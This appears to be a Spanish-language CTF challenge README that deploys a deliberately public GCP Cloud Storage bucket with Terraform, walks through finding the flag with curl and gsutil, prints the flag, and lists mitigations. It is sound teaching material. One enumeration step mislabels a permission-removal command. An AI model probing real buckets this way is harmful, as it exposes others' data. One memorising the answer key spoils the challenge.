# Challenge 01 - GCP Only: Public Storage Misconfiguration

## 🎯 Objetivo del Challenge

Este challenge simula una configuración incorrecta común en Google Cloud Platform donde un bucket de Cloud Storage se configura con permisos públicos, exponiendo archivos sensibles que deberían ser privados.

## 🏗️ Arquitectura del Challenge

```
┌─────────────────────────────────────────┐
│           Google Cloud Platform         │
├─────────────────────────────────────────┤
│  ┌─────────────────────────────────┐    │
│  │      Cloud Storage Bucket       │    │
│  │   ctf-25-website-{random}       │    │
│  │                                 │    │
│  │  📄 index.html (público)        │    │
│  │  🚩 flag.txt (público)          │    │
│  │                                 │    │
│  │  IAM: allUsers → objectViewer   │    │
│  └─────────────────────────────────┘    │
└─────────────────────────────────────────┘
```

## 🚀 Despliegue del Challenge

### Prerrequisitos

1. **Google Cloud CLI instalado y configurado**
   ```bash
   gcloud --version
   gcloud auth list
   ```

2. **Terraform instalado**
   ```bash
   terraform --version
   ```

3. **Autenticación configurada**
   ```bash
   gcloud auth application-default login
   ```

### Pasos de Despliegue

1. **Crear bucket para el estado de Terraform**
   ```bash
   gsutil mb gs://ctf-25-terraform-state-gcp
   ```

2. **Inicializar Terraform**
   ```bash
   terraform init -backend-config=../../backend-configs/gcs-gcp-only.hcl
   ```

3. **Crear archivo de variables (opcional)**
   ```bash
   cp terraform.tfvars.example terraform.tfvars
   # Editar si es necesario
   ```

4. **Planificar el despliegue**
   ```bash
   terraform plan
   ```

5. **Aplicar la configuración**
   ```bash
   terraform apply
   ```

## 🔍 Información del Challenge Desplegado

Después del despliegue exitoso, obtendrás las siguientes URLs:

- **Sitio web**: `https://storage.googleapis.com/{bucket-name}/index.html`
- **Flag**: `https://storage.googleapis.com/{bucket-name}/flag.txt`
- **Bucket**: `{bucket-name}`

## 🕵️ Resolución del Challenge

### Escenario

Te encuentras con una aplicación web de "MediCloudX Store" que parece ser una tienda en línea de dispositivos médicos. Tu objetivo es encontrar información sensible que podría estar expuesta debido a configuraciones incorrectas de seguridad.

### Método 1: Exploración Manual de URLs

1. **Accede al sitio web principal**
   ```bash
   curl https://storage.googleapis.com/ctf-25-website-{random}/index.html
   ```

2. **Intenta acceder a archivos comunes**
   ```bash
   # Probar archivos típicos que podrían contener información sensible
   curl https://storage.googleapis.com/ctf-25-website-{random}/flag.txt
   curl https://storage.googleapis.com/ctf-25-website-{random}/admin.txt
   curl https://storage.googleapis.com/ctf-25-website-{random}/config.txt
   ```

### Método 2: Enumeración con gsutil (si tienes acceso)

1. **Listar contenido del bucket**
   ```bash
   gsutil ls gs://ctf-25-website-{random}/
   ```

2. **Obtener información detallada**
   ```bash
   gsutil ls -l gs://ctf-25-website-{random}/
   ```

### Método 3: Análisis de Permisos IAM

1. **Verificar permisos del bucket**
   ```bash
   gsutil iam get gs://ctf-25-website-{random}/
   ```

2. **Buscar configuraciones de acceso público**
   ```bash
   gsutil iam ch -d allUsers:objectViewer gs://ctf-25-website-{random}/
   ```

### Método 4: Reconocimiento Web

1. **Inspeccionar el código fuente del sitio web**
   - Buscar comentarios ocultos
   - Verificar referencias a otros archivos
   - Analizar estructura de directorios

2. **Usar herramientas de reconocimiento**
   ```bash
   # Con curl y grep para buscar patrones
   curl -s https://storage.googleapis.com/ctf-25-website-{random}/index.html | grep -i "flag\|secret\|admin\|config"
   ```

## 🚩 Obtención del Flag

El flag se encuentra en el archivo `flag.txt` que es públicamente accesible debido a la configuración incorrecta de permisos:

```bash
curl https://storage.googleapis.com/ctf-25-website-{random}/flag.txt
```

**Flag**: `CLD[c9d5e1g4-6h0f-6c3d-be5g-9h4c7f0d8g6e]`

## 🔒 Vulnerabilidades Identificadas

### 1. Permisos Públicos Excesivos
- **Problema**: El bucket tiene permisos `allUsers:objectViewer`
- **Impacto**: Cualquier persona puede acceder a todos los objetos del bucket
- **Riesgo**: Exposición de datos sensibles

### 2. Falta de Controles de Acceso Granulares
- **Problema**: No hay restricciones por objeto individual
- **Impacto**: Archivos sensibles están expuestos junto con contenido público
- **Riesgo**: Filtración de información confidencial

### 3. Configuración de Bucket Insegura
- **Problema**: `uniform_bucket_level_access` habilitado con permisos públicos
- **Impacto**: Simplifica el acceso pero aumenta la superficie de ataque
- **Riesgo**: Acceso no autorizado a recursos

## 🛡️ Mitigaciones Recomendadas

### 1. Implementar Principio de Menor Privilegio
```bash
# Remover acceso público
gsutil iam ch -d allUsers:objectViewer gs://bucket-name/

# Otorgar acceso específico solo a usuarios autorizados
gsutil iam ch user:usuario@dominio.com:objectViewer gs://bucket-name/
```

### 2. Separar Contenido Público y Privado
```bash
# Crear buckets separados
gsutil mb gs://empresa-public-content/
gsutil mb gs://empresa-private-content/
```

### 3. Implementar Controles de Acceso por Objeto
```bash
# Configurar ACLs específicas por objeto
gsutil acl ch -u AllUsers:R gs://bucket/public-file.html
gsutil acl ch -d AllUsers gs://bucket/private-file.txt
```

### 4. Monitoreo y Auditoría
```bash
# Habilitar logging de acceso
gsutil logging set on -b gs://logs-bucket/ gs://target-bucket/

# Revisar configuraciones periódicamente
gsutil iam get gs://bucket-name/
```

## 🧪 Comandos de Verificación

```bash
# Verificar el despliegue
terraform output

# Probar acceso al flag
curl $(terraform output -raw gcp_flag_url)

# Verificar permisos del bucket
gsutil iam get gs://$(terraform output -raw gcp_bucket_name)

# Listar objetos del bucket
gsutil ls gs://$(terraform output -raw gcp_bucket_name)/
```

## 🧹 Limpieza

Para destruir los recursos creados:

```bash
terraform destroy
```

Para eliminar el bucket de estado (opcional):
```bash
gsutil rm -r gs://ctf-25-terraform-state-gcp/
```

## 📚 Referencias

- [Google Cloud Storage Security Best Practices](https://cloud.google.com/storage/docs/best-practices)
- [IAM for Cloud Storage](https://cloud.google.com/storage/docs/access-control/iam)
- [Cloud Storage Access Control](https://cloud.google.com/storage/docs/access-control)
- [Terraform Google Provider](https://registry.terraform.io/providers/hashicorp/google/latest/docs)

## 🏷️ Etiquetas

`#CTF` `#GCP` `#CloudStorage` `#IAM` `#SecurityMisconfiguration` `#PublicBucket` `#Challenge01`
